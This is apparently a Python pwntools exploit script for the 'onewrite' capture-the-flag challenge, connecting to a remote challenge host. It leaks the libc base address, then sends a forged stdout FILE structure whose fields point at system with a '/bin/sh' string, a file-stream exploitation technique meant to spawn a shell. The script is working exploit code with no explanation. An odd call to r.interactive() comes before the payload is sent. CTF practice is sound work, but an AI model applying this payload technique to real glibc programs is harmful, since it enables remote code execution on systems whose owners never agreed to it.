#!/usr/bin/env python3



from pwn import *


e  = ELF("./vuln_patched")
#r = process("./vuln_patched")
r = remote("onewrite.chal.imaginaryctf.org",1337)
libc = ELF("./libc.so.6")
r.recvline()
libc_base = int(r.recvline().strip(),16) - libc.sym.printf
log.info("The libc base of the process is " + hex(libc_base))
r.sendline(hex(libc_base + libc.sym._IO_2_1_stdout_))
payload = p64(0x11111111fbad2005) + b"; /bin/sh\x00\x00\x00\x00\x00\x00\x00" + p64(libc_base + 0x21a803) * 5 + p64(libc_base + 0x21a804) + p64(0) * 4 + p64(libc_base + 0x21aaa0) + p64(1) + p64(0xffffffffffffffff) + p64(0) + p64(libc_base + 2214512) + p64(0xffffffffffffffff) + p64(0) + p64(libc_base + 0x21a8d0) + p64(0) * 3 + p64(0xffffffff) + p64(0) * 2 + p64(libc_base + 0x216018 - 0x38) + p64(libc_base + libc.sym._IO_2_1_stderr_) + p64(libc_base + libc.sym._IO_2_1_stdout_) + p64(libc_base + 0x216018) + p64(libc_base + 0x3a040) + p64(libc_base + 0x2a160) + p64(0) + p64(libc_base + libc.sym.system) + p64(0) * 7 + p64(0) * 28 + p64(libc_base + 0x21a828)
print(len(payload))
r.interactive()
r.sendline(payload)
r.interactive()